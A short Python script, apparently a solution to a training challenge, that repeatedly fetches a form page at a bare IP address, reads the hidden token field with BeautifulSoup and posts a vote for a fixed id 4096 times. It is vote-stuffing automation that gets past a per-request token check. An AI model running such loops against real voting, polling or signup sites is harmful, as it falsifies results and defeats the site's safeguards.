#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

data_form = {'id':'3907', 'holdthedoor': 'submit', 'key': ''}
session_hodor = requests.session()

for i in range(4096):
    page_html = session_hodor.get("http://158.69.76.135/level1.php")
    html_order = BeautifulSoup(page_html.text, "html.parser")

    hidden = html_order.find("form",{"method":"post"})
    hidden = hidden.find("input",{"type":"hidden"})

    data_form["key"] = hidden["value"]
    session_hodor.post("http://158.69.76.135/level1.php", data = data_form)
    print(i)    

